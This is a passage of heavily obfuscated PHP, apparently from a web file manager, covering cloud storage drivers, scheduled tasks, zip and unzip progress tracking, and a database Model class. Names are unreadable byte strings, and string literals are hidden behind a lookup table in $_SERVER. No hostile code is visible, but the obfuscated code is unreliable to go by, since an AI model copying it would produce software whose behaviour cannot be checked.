$û‰ŸÌí‘ = $Õƒ¾öú¬; } if ($Úæ¢‚¸û && $û‰ŸÌí‘) { break; } } return $Úæ¢‚¸û === $û‰ŸÌí‘; } public static function transferType($û—âÒãÑ, $ï±Û˜âõ) { $ûñ¸†œğ =& $_SERVER[¢ñàß¿€]; $ç½âŸ = self::driverType($û—âÒãÑ); $¦‹´íˆ² = self::driverType($ï±Û˜âõ); if ($ç½âŸ[$ûñ¸†œğ[33]] == $¦‹´íˆ²[$ûñ¸†œğ[33]] && $ç½âŸ[$ûñ¸†œğ[1397]] == $¦‹´íˆ²[$ûñ¸†œğ[1397]]) { return $ûñ¸†œğ[1398]; } if ($ç½âŸ[$ûñ¸†œğ[33]] == $ûñ¸†œğ[939] && $¦‹´íˆ²[$ûñ¸†œğ[33]] == $ûñ¸†œğ[109]) { return $ûñ¸†œğ[1276]; } if ($ç½âŸ[$ûñ¸†œğ[33]] == $ûñ¸†œğ[109] && $¦‹´íˆ²[$ûñ¸†œğ[33]] == $ûñ¸†œğ[939]) { return $ûñ¸†œğ[110]; } return $ûñ¸†œğ[1399]; } public static function driverType($Íª†Çâ) { $ÚÄ²û¿Ì =& $_SERVER[¢ñàß¿€]; $»–ü€ÓÂ = str_replace($ÚÄ²û¿Ì[1400], $ÚÄ²û¿Ì[12], strtolower($Íª†Çâ->getType())); if ($»–ü€ÓÂ == $ÚÄ²û¿Ì[828] || $»–ü€ÓÂ == $ÚÄ²û¿Ì[1401] || $»–ü€ÓÂ == $ÚÄ²û¿Ì[1402]) { $Íª†Çâ = self::defaultDriverInit(); } else { if ($»–ü€ÓÂ == $ÚÄ²û¿Ì[1286] || $»–ü€ÓÂ == $ÚÄ²û¿Ì[1403]) { $Íª†Çâ = IO::init($Íª†Çâ->pathParse[$ÚÄ²û¿Ì[1229]]); } } $ÜõàòºÆ = $Íª†Çâ->path; $»–ü€ÓÂ = str_replace($ÚÄ²û¿Ì[1400], $ÚÄ²û¿Ì[12], strtolower($Íª†Çâ->getType())); if ($»–ü€ÓÂ == $ÚÄ²û¿Ì[109]) { return array($ÚÄ²û¿Ì[33] => $ÚÄ²û¿Ì[109], $ÚÄ²û¿Ì[1397] => $ÚÄ²û¿Ì[12], $ÚÄ²û¿Ì[87] => $ÜõàòºÆ, $ÚÄ²û¿Ì[98] => $Íª†Çâ); } return array($ÚÄ²û¿Ì[33] => $ÚÄ²û¿Ì[939], $ÚÄ²û¿Ì[1397] => $Íª†Çâ->pathDriver, $ÚÄ²û¿Ì[87] => $ÜõàòºÆ, $ÚÄ²û¿Ì[98] => $Íª†Çâ); } public static function pathDriverType($À¸ãß¶š) { return $À¸ãß¶š ? self::driverType(IO::init($À¸ãß¶š)) : !1; } public static function pathDriverLocal($Û‡ú›è) { $åÓ¹ÖÕâ =& $_SERVER[¢ñàß¿€]; $¢ÀñÜÇš = $Û‡ú›è ? self::driverType(IO::init($Û‡ú›è)) : !1; return $¢ÀñÜÇš[$åÓ¹ÖÕâ[33]] == $åÓ¹ÖÕâ[109] ? !0 : !1; } public static function allowCover($°ò¯Ê¦Ã, $Æ÷ù÷×ò = true) { $±ÊŸÕ°ƒ =& $_SERVER[¢ñàß¿€]; if (is_string($°ò¯Ê¦Ã)) { $°ò¯Ê¦Ã = IO::info($°ò¯Ê¦Ã); } if (!$°ò¯Ê¦Ã || $°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[33]] == $±ÊŸÕ°ƒ[78] || $°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[79]] <= 100) { return !1; } if (isset($°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[1404]]) || !$°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[87]]) { return !1; } if (isset($°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[232]]) && !$°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[232]]) { return !1; } static $ –£øÒ“ = false; if (!$ –£øÒ“ || !$Æ÷ù÷×ò) { $‰ÛÉªšæ = self::driverType(IO::init($°ò¯Ê¦Ã[$±ÊŸÕ°ƒ[87]])); $õ•‡ƒÌ = $‰ÛÉªšæ[$±ÊŸÕ°ƒ[98]]; $ –£øÒ“ = $±ÊŸÕ°ƒ[196]; if ($‰ÛÉªšæ[$±ÊŸÕ°ƒ[33]] == $±ÊŸÕ°ƒ[109]) { $ –£øÒ“ = $±ÊŸÕ°ƒ[1405]; } if ($‰ÛÉªšæ[$±ÊŸÕ°ƒ[98]] && is_array($‰ÛÉªšæ[$±ÊŸÕ°ƒ[98]]->config)) { $øì·°íÙ = $‰ÛÉªšæ[$±ÊŸÕ°ƒ[98]]->config; if (isset($øì·°íÙ[$±ÊŸÕ°ƒ[1406]]) && $øì·°íÙ[$±ÊŸÕ°ƒ[1406]]) { $ –£øÒ“ = $±ÊŸÕ°ƒ[1405]; } } } return $ –£øÒ“ == $±ÊŸÕ°ƒ[1405] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ø®ª§î«) { parent::__construct($ø®ª§î«); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Î¼İüó†) { $»º°³¶ =& $_SERVER[¢ñàß¿€]; if (substr($Î¼İüó†, 0, 7) == $»º°³¶[313]) { $Î¼İüó† = $»º°³¶[314] . substr($Î¼İüó†, 7); } header($»º°³¶[175] . $Î¼İüó†); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¾‰œøêÖ) { parent::__construct($¾‰œøêÖ); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } public function uploadFormData($óÆ´®›Ò, $ºĞºİüû = 3600) { $æ·Îû¶Ñ =& $_SERVER[¢ñàß¿€]; $ù®à·–ì = $æ·Îû¶Ñ[229]; $êû§Í´ö = $æ·Îû¶Ñ[263]; $˜Úî‘õì = $æ·Îû¶Ñ[274]; $é†ö‰§· = gmdate($æ·Îû¶Ñ[299], time() + $ºĞºİüû); $¯¶ÓæÕê = (string) time() . $æ·Îû¶Ñ[74] . (string) (time() + $ºĞºİüû); $Õ–¬Ñç = array($æ·Îû¶Ñ[275] => $é†ö‰§·, $æ·Îû¶Ñ[278] => array(array($æ·Îû¶Ñ[280] => $ù®à·–ì), array($æ·Îû¶Ñ[279] => $this->bucket), array($æ·Îû¶Ñ[281], $æ·Îû¶Ñ[282], $æ·Îû¶Ñ[12]), array($æ·Îû¶Ñ[285] => $˜Úî‘õì), array($æ·Îû¶Ñ[1407] => $êû§Í´ö), array($æ·Îû¶Ñ[1408] => $this->accessKey), array($æ·Îû¶Ñ[1409] => $¯¶ÓæÕê))); $Õ–¬Ñç = json_encode($Õ–¬Ñç); $öì¤ú” = hash_hmac($æ·Îû¶Ñ[263], $¯¶ÓæÕê, $this->secret); $¦°‹”˜Ê = sha1($Õ–¬Ñç); $£Øèó»Ù = hash_hmac($æ·Îû¶Ñ[263], $¦°‹”˜Ê, $öì¤ú”); $şïËƒ¿÷ = array($æ·Îû¶Ñ[280] => $ù®à·–ì, $æ·Îû¶Ñ[285] => $˜Úî‘õì, $æ·Îû¶Ñ[293] => base64_encode($Õ–¬Ñç), $æ·Îû¶Ñ[1407] => $êû§Í´ö, $æ·Îû¶Ñ[1408] => $this->accessKey, $æ·Îû¶Ñ[1410] => $¯¶ÓæÕê, $æ·Îû¶Ñ[1411] => $£Øèó»Ù, $æ·Îû¶Ñ[208] => $this->getHost()); return $şïËƒ¿÷; } public function fileOutImage($–îØ¢‰©, $ö¢÷×•€ = 250) { $©îõŞÕˆ =& $_SERVER[¢ñàß¿€]; if ($this->size($–îØ¢‰©) > 1024 * 1024 * 32) { return $this->fileOutImageServer($–îØ¢‰©, $ö¢÷×•€); } $¥ã¤ÓÆÓ = $this->link($–îØ¢‰©); $¥ã¤ÓÆÓ .= $©îõŞÕˆ[1412] . $ö¢÷×•€ . $©îõŞÕˆ[1413]; $this->fileOutLink($¥ã¤ÓÆÓ); } public function fileOutLink($¿şŠı¼î) { $•øüå³ú =& $_SERVER[¢ñàß¿€]; if (substr($¿şŠı¼î, 0, 7) == $•øüå³ú[313]) { $¿şŠı¼î = $•øüå³ú[314] . substr($¿şŠı¼î, 7); } header($•øüå³ú[175] . $¿şŠı¼î); die; } } goto D‚¯Œ†ğªÔ; AÛáïŒ³¤: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ã·õûÄ½, $Ì«“¿Ğ = 5.0) { if (!$Ã·õûÄ½) { return; } $ù‰ÓØ­ï = Cache::get($Ã·õûÄ½); if (!$ù‰ÓØ­ï || timeFloat() - floatVal($ù‰ÓØ­ï) >= $Ì«“¿Ğ) { Cache::set($Ã·õûÄ½, timeFloat(), $Ì«“¿Ğ * 10); return !0; } return !1; } public static function timeLimitCall($ûÓšÆô, $ÇøÇŒ–Œ, $ç¸ı¤±, $«Ü¿íè… = 5.0) { $„¡²ÀÁŸ =& $_SERVER[¢ñàß¿€]; if (!$ûÓšÆô || !$ÇøÇŒ–Œ) { return; } self::$asyncAdd = !0; $¶˜Ë™‡¬ = $„¡²ÀÁŸ[1876]; $Í†ØŞ“ô = Cache::get($¶˜Ë™‡¬, !0); $â¿›ÄÕÂ = array($„¡²ÀÁŸ[1877] => timeFloat(), $„¡²ÀÁŸ[1878] => timeFloat(), $„¡²ÀÁŸ[341] => $ÇøÇŒ–Œ, $„¡²ÀÁŸ[1868] => $ç¸ı¤±, $„¡²ÀÁŸ[206] => $«Ü¿íè…); if (is_array($Í†ØŞ“ô[$ûÓšÆô])) { $â¿›ÄÕÂ[$„¡²ÀÁŸ[1878]] = $Í†ØŞ“ô[$ûÓšÆô][$„¡²ÀÁŸ[1878]]; } if (is_array($Í†ØŞ“ô[$ûÓšÆô])) { if (timeFloat() - $Í†ØŞ“ô[$ûÓšÆô][$„¡²ÀÁŸ[1877]] < $â¿›ÄÕÂ[$„¡²ÀÁŸ[206]] * 0.3) { return; } $â¿›ÄÕÂ[$„¡²ÀÁŸ[1878]] = $Í†ØŞ“ô[$ûÓšÆô][$„¡²ÀÁŸ[1878]]; } $Í†ØŞ“ô[$ûÓšÆô] = $â¿›ÄÕÂ; Cache::set($¶˜Ë™‡¬, $Í†ØŞ“ô, 60); Cache::removeMemory($¶˜Ë™‡¬); write_log($„¡²ÀÁŸ[1879] . $ûÓšÆô . $„¡²ÀÁŸ[74] . $ÇøÇŒ–Œ, $„¡²ÀÁŸ[197]); } public static function timeLimitCallLoop() { $Ú£òÓµœ =& $_SERVER[¢ñàß¿€]; $ô±°ãÈÚ = array($Ú£òÓµœ[1880]); $ö—˜ŸË‰ = in_array(strtolower(ACTION), $ô±°ãÈÚ); if (!$ö—˜ŸË‰ && !self::$asyncAdd) { return; } $‹âÊù÷ = $Ú£òÓµœ[1876]; $ìÇºæ¨À = Cache::get($‹âÊù÷, !0); if (!$ìÇºæ¨À || count($ìÇºæ¨À) <= 0) { return; } $¡Øô¹Ê = !1; $ªº×îéÚ = timeFloat(); $Ù½‹¼•× = array(); foreach ($ìÇºæ¨À as $‡—¬Š‘ => $µ½à§ÁÀ) { if ($ªº×îéÚ - $µ½à§ÁÀ[$Ú£òÓµœ[1878]] > $µ½à§ÁÀ[$Ú£òÓµœ[206]]) { $¡Øô¹Ê = !0; try { Hook::apply($µ½à§ÁÀ[$Ú£òÓµœ[341]], $µ½à§ÁÀ[$Ú£òÓµœ[1868]]); write_log($Ú£òÓµœ[1881] . $‡—¬Š‘ . $Ú£òÓµœ[74] . $µ½à§ÁÀ[$Ú£òÓµœ[341]] . $Ú£òÓµœ[1882] . ACTION, $Ú£òÓµœ[197]); } catch (Exception $Èóç¡¤•) { } continue; } $Ù½‹¼•×[$‡—¬Š‘] = $µ½à§ÁÀ; } if (!$¡Øô¹Ê) { return; } if (!$Ù½‹¼•×) { return Cache::remove($‹âÊù÷); } Cache::set($‹âÊù÷, $Ù½‹¼•×, 60); Cache::removeMemory($‹âÊù÷); } public static function finished($ˆ˜ÖµŒ³, $Ğ–îÛáÈ) { $™Ü™„•· =& $_SERVER[¢ñàß¿€]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($™Ü™„•·[341] => $ˆ˜ÖµŒ³, $™Ü™„•·[1868] => $Ğ–îÛáÈ); } private static function finishedRun() { $™Ä Šé• =& $_SERVER[¢ñàß¿€]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¶Ã¢Ù¯Ö) { try { Hook::apply($¶Ã¢Ù¯Ö[$™Ä Šé•[341]], $¶Ã¢Ù¯Ö[$™Ä Šé•[1868]]); } catch (Exception $´åëÍªø) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÛÓµÚÜĞ =& $_SERVER[¢ñàß¿€]; parent::startAfter(); Hook::bind($ÛÓµÚÜĞ[1883], array($this, $ÛÓµÚÜĞ[1884])); Hook::bind($ÛÓµÚÜĞ[1275], array($this, $ÛÓµÚÜĞ[1885])); Hook::bind($ÛÓµÚÜĞ[1886], array($this, $ÛÓµÚÜĞ[1887])); $®Üİ¿Å„ =& $this->task; $®Üİ¿Å„[$ÛÓµÚÜĞ[1888]] = $ÛÓµÚÜĞ[1276]; if (!$®Üİ¿Å„[$ÛÓµÚÜĞ[1659]]) { $®Üİ¿Å„[$ÛÓµÚÜĞ[1659]] = LNG($ÛÓµÚÜĞ[1889]); } } protected function endAfter() { $üÇ˜Œ´† =& $_SERVER[¢ñàß¿€]; parent::endAfter(); Hook::unbind($üÇ˜Œ´†[1883], array($this, $üÇ˜Œ´†[1884])); Hook::unbind($üÇ˜Œ´†[1275], array($this, $üÇ˜Œ´†[1885])); Hook::unbind($üÇ˜Œ´†[1886], array($this, $üÇ˜Œ´†[1887])); } public function updateAfter() { $å°å§‚Œ =& $_SERVER[¢ñàß¿€]; $ãâÁØ¾’ =& $this->task; if (!$ãâÁØ¾’[$å°å§‚Œ[1138]] || !$ãâÁØ¾’[$å°å§‚Œ[834]]) { if ($ãâÁØ¾’[$å°å§‚Œ[1888]] != $å°å§‚Œ[389]) { return; } } if ($ãâÁØ¾’[$å°å§‚Œ[1888]] == $å°å§‚Œ[1276]) { $ÛÒìÕÌÌ = 0; if ($ãâÁØ¾’[$å°å§‚Œ[1823]]) { $ÛÒìÕÌÌ = $ãâÁØ¾’[$å°å§‚Œ[1824]] / $ãâÁØ¾’[$å°å§‚Œ[1823]]; } $ãâÁØ¾’[$å°å§‚Œ[1772]] = $ÛÒìÕÌÌ * 0.3; } else { if ($ãâÁØ¾’[$å°å§‚Œ[1888]] == $å°å§‚Œ[389]) { $ÛÒìÕÌÌ = $ãâÁØ¾’[$å°å§‚Œ[1771]] / $ãâÁØ¾’[$å°å§‚Œ[1138]]; $ãâÁØ¾’[$å°å§‚Œ[1772]] = 0.3 + $ÛÒìÕÌÌ * 0.4; } else { if ($ãâÁØ¾’[$å°å§‚Œ[1888]] == $å°å§‚Œ[110]) { $Ôøé†œ² = 0; if ($ãâÁØ¾’[$å°å§‚Œ[1825]] == $å°å§‚Œ[110]) { $Ôøé†œ² = $ãâÁØ¾’[$å°å§‚Œ[1824]]; } $ÛÒìÕÌÌ = ($ãâÁØ¾’[$å°å§‚Œ[1828]] + $Ôøé†œ²) / $ãâÁØ¾’[$å°å§‚Œ[834]]; $ãâÁØ¾’[$å°å§‚Œ[1772]] = 0.3 + 0.4 + $ÛÒìÕÌÌ * 0.3; } } } if ($ãâÁØ¾’[$å°å§‚Œ[1772]] > 0) { $ïÀ¬âÇ = timeFloat() - $ãâÁØ¾’[$å°å§‚Œ[1774]] - $ãâÁØ¾’[$å°å§‚Œ[1777]]; $ãâÁØ¾’[$å°å§‚Œ[1778]] = $ïÀ¬âÇ * (1 - $ãâÁØ¾’[$å°å§‚Œ[1772]]) / $ãâÁØ¾’[$å°å§‚Œ[1772]]; } } public function addFile($ˆø‹£—) { $Í¼ş¬ˆ =& $_SERVER[¢ñàß¿€]; $¼ÉË—ø÷ =& $this->task; $¿¼ûÆâÉ = IO::info($ˆø‹£—); $¼ÉË—ø÷[$Í¼ş¬ˆ[1821]] = $¿¼ûÆâÉ[$Í¼ş¬ˆ[32]]; $¼ÉË—ø÷[$Í¼ş¬ˆ[1823]] = $¿¼ûÆâÉ[$Í¼ş¬ˆ[79]]; $¼ÉË—ø÷[$Í¼ş¬ˆ[1824]] = 0; $¼ÉË—ø÷[$Í¼ş¬ˆ[1140]] = $Í¼ş¬ˆ[1844]; $¼ÉË—ø÷[$Í¼ş¬ˆ[1825]] = $Í¼ş¬ˆ[1276]; $¼ÉË—ø÷[$Í¼ş¬ˆ[834]] = $¿¼ûÆâÉ[$Í¼ş¬ˆ[79]]; $¼ÉË—ø÷[$Í¼ş¬ˆ[1138]] = 1; $˜ùÄ«¾¦ = 0; $¼ÉË—ø÷[$Í¼ş¬ˆ[1832]] = array($Í¼ş¬ˆ[1833] => $˜ùÄ«¾¦ + 1, $Í¼ş¬ˆ[494] => $¿¼ûÆâÉ[$Í¼ş¬ˆ[32]], $Í¼ş¬ˆ[87] => $¿¼ûÆâÉ[$Í¼ş¬ˆ[87]], $Í¼ş¬ˆ[582] => $¿¼ûÆâÉ[$Í¼ş¬ˆ[582]] ? $¿¼ûÆâÉ[$Í¼ş¬ˆ[582]] : $¿¼ûÆâÉ[$Í¼ş¬ˆ[87]]); $this->update(); } public function zipEvent($ëĞ‡Š, $—ÂÛéŞ, $ÏâÈÅå, $Ôí“ßÕ÷) { $§ÏÍšš· =& $_SERVER[¢ñàß¿€]; $ƒĞˆ¸”¢ =& $this->task; $ƒĞˆ¸”¢[$§ÏÍšš·[1821]] = get_path_this($—ÂÛéŞ); $ƒĞˆ¸”¢[$§ÏÍšš·[1823]] = $Ôí“ßÕ÷; $ƒĞˆ¸”¢[$§ÏÍšš·[1824]] = $ÏâÈÅå; $ƒĞˆ¸”¢[$§ÏÍšš·[1140]] = $ëĞ‡Š == $§ÏÍšš·[1890] ? $§ÏÍšš·[1891] : $§ÏÍšš·[1892]; $ƒĞˆ¸”¢[$§ÏÍšš·[1825]] = $§ÏÍšš·[12]; $ƒĞˆ¸”¢[$§ÏÍšš·[834]] = $Ôí“ßÕ÷; $ƒĞˆ¸”¢[$§ÏÍšš·[1888]] = $§ÏÍšš·[389]; $this->update(); } public function unzipAfter($Å‚ş´¼Û) { $Ô‘±ŒØ× =& $_SERVER[¢ñàß¿€]; $©óêşÆ¢ =& $this->task; $©óêşÆ¢[$Ô‘±ŒØ×[1888]] = $Ô‘±ŒØ×[110]; $¯óí£Ò = IO::infoWithChildren($Å‚ş´¼Û); $‚ç€é¦æ = 0; $©óêşÆ¢[$Ô‘±ŒØ×[1832]] = array($Ô‘±ŒØ×[1833] => $‚ç€é¦æ + 1, $Ô‘±ŒØ×[494] => $¯óí£Ò[$Ô‘±ŒØ×[32]], $Ô‘±ŒØ×[87] => $¯óí£Ò[$Ô‘±ŒØ×[87]], $Ô‘±ŒØ×[582] => $¯óí£Ò[$Ô‘±ŒØ×[582]] ? $¯óí£Ò[$Ô‘±ŒØ×[582]] : $¯óí£Ò[$Ô‘±ŒØ×[87]]); if ($¯óí£Ò[$Ô‘±ŒØ×[33]] == $Ô‘±ŒØ×[230]) { $©óêşÆ¢[$Ô‘±ŒØ×[1138]] = 1; } else { $©óêşÆ¢[$Ô‘±ŒØ×[1138]] = $¯óí£Ò[$Ô‘±ŒØ×[82]][$Ô‘±ŒØ×[80]]; } $©óêşÆ¢[$Ô‘±ŒØ×[1140]] = $Ô‘±ŒØ×[12]; $©óêşÆ¢[$Ô‘±ŒØ×[1825]] = 0; $©óêşÆ¢[$Ô‘±ŒØ×[1771]] = 0; $©óêşÆ¢[$Ô‘±ŒØ×[1823]] = 0; $©óêşÆ¢[$Ô‘±ŒØ×[1824]] = 0; $©óêşÆ¢[$Ô‘±ŒØ×[1821]] = $Ô‘±ŒØ×[12]; $©óêşÆ¢[$Ô‘±ŒØ×[1828]] = 0; $©óêşÆ¢[$Ô‘±ŒØ×[834]] = $¯óí£Ò[$Ô‘±ŒØ×[79]]; $this->update(); self::log($Ô‘±ŒØ×[1893] . json_encode(array($©óêşÆ¢, $¯óí£Ò))); } public function nameParse($ª¢Êõ…) { $ÇôµœÍÖ =& $_SERVER[¢ñàß¿€]; $”¾³şÉ¹ =& $this->task; if ($”¾³şÉ¹[$ÇôµœÍÖ[1888]] == $ÇôµœÍÖ[1276]) { $”¾³şÉ¹[$ÇôµœÍÖ[1888]] = $ÇôµœÍÖ[389]; $”¾³şÉ¹[$ÇôµœÍÖ[1828]] = 0; $”¾³şÉ¹[$ÇôµœÍÖ[834]] = 0; } $÷¦‚Ì¤ó = get_path_this($ª¢Êõ…); if (strstr($÷¦‚Ì¤ó, $ÇôµœÍÖ[10])) { $”¾³şÉ¹[$ÇôµœÍÖ[1771]] += 1; $”¾³şÉ¹[$ÇôµœÍÖ[1138]] += 1; } $”¾³şÉ¹[$ÇôµœÍÖ[1821]] = $ª¢Êõ…; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $‰éı©Úë =& $_SERVER[¢ñàß¿€]; parent::startAfter(); Hook::bind($‰éı©Úë[1894], array($this, $‰éı©Úë[1884])); Hook::bind($‰éı©Úë[1886], array($this, $‰éı©Úë[1887])); $ó—îÄç =& $this->task; $ó—îÄç[$‰éı©Úë[1888]] = $‰éı©Úë[1276]; if (!$ó—îÄç[$‰éı©Úë[1659]]) { $ó—îÄç[$‰éı©Úë[1659]] = LNG($‰éı©Úë[1895]); } } protected function endAfter() { $µØµù¾ü =& $_SERVER[¢ñàß¿€]; parent::endAfter(); Hook::unbind($µØµù¾ü[1894], array($this, $µØµù¾ü[1884])); Hook::unbind($µØµù¾ü[1886], array($this, $µØµù¾ü[1887])); } public function updateAfter() { $Ÿ–úÃã‚ =& $_SERVER[¢ñàß¿€]; $»‡œƒÏù =& $this->task; if (!$»‡œƒÏù[$Ÿ–úÃã‚[1138]] || !$»‡œƒÏù[$Ÿ–úÃã‚[834]]) { return; } if ($»‡œƒÏù[$Ÿ–úÃã‚[1888]] == $Ÿ–úÃã‚[1276]) { $ç®æ¹ù¹ = $»‡œƒÏù[$Ÿ–úÃã‚[1824]]; if ($»‡œƒÏù[$Ÿ–úÃã‚[1825]] != $Ÿ–úÃã‚[1276]) { $ç®æ¹ù¹ = 0; } $¢×ïÚøé = ($»‡œƒÏù[$Ÿ–úÃã‚[1828]] + $ç®æ¹ù¹) / $»‡œƒÏù[$Ÿ–úÃã‚[834]]; $»‡œƒÏù[$Ÿ–úÃã‚[1772]] = $¢×ïÚøé * 0.3; } else { if ($»‡œƒÏù[$Ÿ–úÃã‚[1888]] == $Ÿ–úÃã‚[389]) { $¢×ïÚøé = $»‡œƒÏù[$Ÿ–úÃã‚[1771]] / $»‡œƒÏù[$Ÿ–úÃã‚[1138]]; $»‡œƒÏù[$Ÿ–úÃã‚[1772]] = 0.3 + $¢×ïÚøé * 0.5; } else { if ($»‡œƒÏù[$Ÿ–úÃã‚[1888]] == $Ÿ–úÃã‚[110]) { $¢×ïÚøé = 0; if ($»‡œƒÏù[$Ÿ–úÃã‚[1823]]) { $¢×ïÚøé = $»‡œƒÏù[$Ÿ–úÃã‚[1824]] / $»‡œƒÏù[$Ÿ–úÃã‚[1823]]; } $»‡œƒÏù[$Ÿ–úÃã‚[1772]] = 0.3 + 0.5 + $¢×ïÚøé * 0.2; } } } if ($»‡œƒÏù[$Ÿ–úÃã‚[1772]] > 0) { $¦ß¤ø©Š = timeFloat() - $»‡œƒÏù[$Ÿ–úÃã‚[1774]] - $»‡œƒÏù[$Ÿ–úÃã‚[1777]]; $»‡œƒÏù[$Ÿ–úÃã‚[1778]] = $¦ß¤ø©Š * (1 - $»‡œƒÏù[$Ÿ–úÃã‚[1772]]) / $»‡œƒÏù[$Ÿ–úÃã‚[1772]]; } } public function copyFileStart($é¸ïô³, $²¸²æÇú, $õÆĞæƒš, $ÛÈ«©è, $ÖÆ¸â’Ñ, $¡–¬·Ğ‚) { $±ÛïÍî =& $_SERVER[¢ñàß¿€]; parent::copyFileStart($é¸ïô³, $²¸²æÇú, $õÆĞæƒš, $ÛÈ«©è, $ÖÆ¸â’Ñ, $¡–¬·Ğ‚); $†Ô¹ë›» =& $this->task; if ($†Ô¹ë›»[$±ÛïÍî[1888]] == $±ÛïÍî[389]) { $†Ô¹ë›»[$±ÛïÍî[1888]] = $±ÛïÍî[110]; } $this->update(); } public function copyFileEnd($´îÒç¯É, $é¤ÙõÄ¥, $®ÕÛĞÈé, $İ•Œîøµ, $Ã­×ëß·, $§Ş¾ì›¿) { $³‡–€„Ì =& $_SERVER[¢ñàß¿€]; $†÷Ã =& $this->task; $†÷Ã[$³‡–€„Ì[1824]] = $†÷Ã[$³‡–€„Ì[1823]]; $†÷Ã[$³‡–€„Ì[1828]] += $†÷Ã[$³‡–€„Ì[1823]]; $†÷Ã[$³‡–€„Ì[1825]] = $³‡–€„Ì[12]; $this->update(); } public function zipEvent($Üé“’®, $Ùó¦ìÒ, $òù±Œß¼, $­ÃŒó) { $î£™ûı˜ =& $_SERVER[¢ñàß¿€]; $ı«Ö­Ùß =& $this->task; $ı«Ö­Ùß[$î£™ûı˜[1821]] = get_path_this($Ùó¦ìÒ); $ı«Ö­Ùß[$î£™ûı˜[1823]] = $­ÃŒó; $ı«Ö­Ùß[$î£™ûı˜[1824]] = $òù±Œß¼; $ı«Ö­Ùß[$î£™ûı˜[1140]] = $Üé“’® == $î£™ûı˜[1896] ? $î£™ûı˜[1891] : $î£™ûı˜[1892]; $ı«Ö­Ùß[$î£™ûı˜[1825]] = $î£™ûı˜[12]; $ı«Ö­Ùß[$î£™ûı˜[834]] = $­ÃŒó; $ı«Ö­Ùß[$î£™ûı˜[1888]] = $î£™ûı˜[389]; $this->update(); } public function nameParse($”êéáÍø) { $£ÎÒ˜åó =& $_SERVER[¢ñàß¿€]; $àâ±‹³ =& $this->task; if ($àâ±‹³[$£ÎÒ˜åó[1771]] < $àâ±‹³[$£ÎÒ˜åó[1138]]) { $Æï¿Á›¹ = get_path_this($”êéáÍø); if (strstr($Æï¿Á›¹, $£ÎÒ˜åó[10])) { $àâ±‹³[$£ÎÒ˜åó[1771]] += 1; } } if ($àâ±‹³[$£ÎÒ˜åó[1888]] == $£ÎÒ˜åó[1276]) { $àâ±‹³[$£ÎÒ˜åó[1888]] = $£ÎÒ˜åó[389]; } $àâ±‹³[$£ÎÒ˜åó[1821]] = $”êéáÍø; $this->update(); } } goto bØ®ª„÷ï†; CîìƒÛ†Õñ: define($_SERVER[¢ñàß¿€][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\145", "\157\x72\x64\145\162", "\x61\x6c\x69\141\163", "\x68\x61\x76\151\x6e\x67", "\147\x72\x6f\x75\x70", "\x6c\157\143\153", "\x64\151\x73\164\151\x6e\x63\164", "\x61\x75\x74\157", "\x66\151\x6c\164\145\162", "\x76\141\x6c\x69\x64\x61\164\x65", "\162\145\x73\165\154\164", "\142\151\156\x64", "\164\157\153\x65\156"); public function __construct($üœ·¥ˆ = '', $ûûù®–± = '', $£æ§õæ¶ = '') { $Š´šÄÙÒ =& $_SERVER[¢ñàß¿€]; $this->_initialize(); if (!empty($üœ·¥ˆ)) { if (strpos($üœ·¥ˆ, $Š´šÄÙÒ[10])) { list($this->dbName, $this->name) = explode($Š´šÄÙÒ[10], $üœ·¥ˆ); } else { $this->name = $üœ·¥ˆ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ûûù®–±)) { $this->tablePrefix = $Š´šÄÙÒ[12]; } elseif ($Š´šÄÙÒ[12] != $ûûù®–±) { $this->tablePrefix = $ûûù®–±; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Š´šÄÙÒ[321]); } $this->db(0, empty($this->connection) ? $£æ§õæ¶ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $áœ³¼… =& $_SERVER[¢ñàß¿€]; if (empty($this->fields)) { if (think_config($áœ³¼…[322])) { $‡–éì‰İ = $this->dbName ? $this->dbName : think_config($áœ³¼…[323]); $—™ŒáË• = think_var_cache($áœ³¼…[324] . strtolower(get_path_this($‡–éì‰İ) . $áœ³¼…[10] . $this->name)); if ($—™ŒáË•) { $ùÜóåù› = think_config($áœ³¼…[325]); if (empty($ùÜóåù›) || $—™ŒáË•[$áœ³¼…[326]] == $ùÜóåù›) { $this->fields = $—™ŒáË•; return; } } } $this->flush(); } } public function flush() { $ªà¡Ü° =& $_SERVER[¢ñàß¿€]; $this->db->setModel($this->name); $©ÆÏ‹® = $this->db->getFields($this->getTableName()); if (!$©ÆÏ‹®) { return !1; } $this->fields = array_keys($©ÆÏ‹®); $this->fields[$ªà¡Ü°[327]] = !1; foreach ($©ÆÏ‹® as $ŠğÙ†èÅ => $¥¥Èì…Ù) { $²ù½…Ş½[$ŠğÙ†èÅ] = $¥¥Èì…Ù[$ªà¡Ü°[33]]; if ($¥¥Èì…Ù[$ªà¡Ü°[39]]) { $this->fields[$ªà¡Ü°[328]] = $ŠğÙ†èÅ; if ($¥¥Èì…Ù[$ªà¡Ü°[42]]) { $this->fields[$ªà¡Ü°[327]] = !0; } } } $this->fields[$ªà¡Ü°[329]] = $²ù½…Ş½; if 